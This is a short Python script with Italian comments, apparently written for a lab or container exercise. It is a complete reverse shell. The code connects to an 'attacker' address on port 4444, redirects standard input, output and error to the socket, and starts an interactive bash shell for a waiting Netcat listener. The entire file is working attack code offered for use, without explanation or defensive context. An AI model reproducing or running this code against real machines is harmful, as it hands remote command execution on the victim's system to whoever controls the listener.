import socket
import subprocess
import os

ATTACKER_IP = "172.17.0.1"
ATTACKER_PORT = 4444

def exploit():
    try:
        print(f"[*] Tentativo di connessione a {ATTACKER_IP}:{ATTACKER_PORT}...")
        
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        s.connect((ATTACKER_IP, ATTACKER_PORT))
        print("[+] Connessione stabilita! Guarda il tuo terminale Netcat.")

        # Reindirizzamento standard I/O
        os.dup2(s.fileno(), 0) # stdin
        os.dup2(s.fileno(), 1) # stdout
        os.dup2(s.fileno(), 2) # stderr

        # Lancio della shell
        subprocess.call(["/bin/bash", "-i"])
        
    except Exception as e:
        print(f"[-] Errore: {e}")

if __name__ == "__main__":
    exploit()